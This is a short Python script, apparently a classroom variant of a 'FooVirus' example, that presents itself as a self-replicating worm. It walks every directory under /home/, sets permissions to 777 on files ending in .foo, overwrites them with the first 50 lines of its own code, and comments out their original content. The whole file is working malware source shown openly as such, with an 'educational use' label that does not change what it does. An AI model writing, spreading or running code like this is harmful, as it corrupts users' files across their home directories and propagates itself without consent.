#!/usr/bin/env python3
import sys
import os
import glob

## FooWorm.py - Modified from FooVirus.py
## Author: Modified for educational use
## Date: March 2025

print("\nHELLO FROM FooWorm\n")
print("This is a demonstration of a self-replicating worm.")
print("It will infect all '.foo' files across multiple directories.\n")

# Step 1: Read the worm's own code into memory
with open(sys.argv[0], 'r') as self_file:
    virus_code = [line for (i, line) in enumerate(self_file) if i < 50]  # Read first 50 lines

# Step 2: Infect all .foo files in multiple directories
def infect_files():
    for root, dirs, files in os.walk("/home/"):  # Scans all user directories
        for file in files:
            if file.endswith(".foo"):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'r') as target_file:
                        content = target_file.readlines()
                    
                    if any("FooWorm" in line for line in content):  # Avoid reinfecting files
                        continue
                    
                    os.chmod(file_path, 0o777)  # Ensure write permissions (fixed syntax for Python 3)
                    with open(file_path, 'w') as target_file:
                        target_file.writelines(virus_code)  # Insert worm code
                        target_file.writelines(['# ' + line for line in content])  # Comment out original content

                    print(f"Infected: {file_path}")

                except Exception as e:
                    print(f"Error infecting {file_path}: {e}")

# Step 3: Execute infection process
if __name__ == "__main__":
    print("Starting FooWorm...")
    infect_files()
    print("Infection completed.")

##folder to folder propagation